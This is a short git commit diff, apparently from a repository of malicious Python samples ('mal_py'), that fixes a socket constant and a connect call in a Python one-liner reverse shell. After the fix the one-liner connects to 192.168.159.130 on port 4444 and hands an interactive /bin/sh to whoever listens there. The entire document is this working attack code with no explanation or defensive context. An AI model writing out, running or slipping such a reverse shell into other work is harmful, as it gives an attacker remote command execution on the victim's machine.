206d3b608fa50a0178ca3df979473dd5543d7e23
fanzhefu <68694994+fanzhefu@users.noreply.github.com>
2025-07-17 20:31:45 -0400

    Update rev_py_00.py

--- mal_py/rev_py_00.py
+++ mal_py/rev_py_00.py
@@ -1,5 +1,5 @@
 python -c 'import socket,subprocess,os; 
-s=socket.socket(socket.AF_INET,socket.SOCKET_STREAM);
-s=connect(("192.168.159.130",4444));
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("192.168.159.130",4444));
 os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
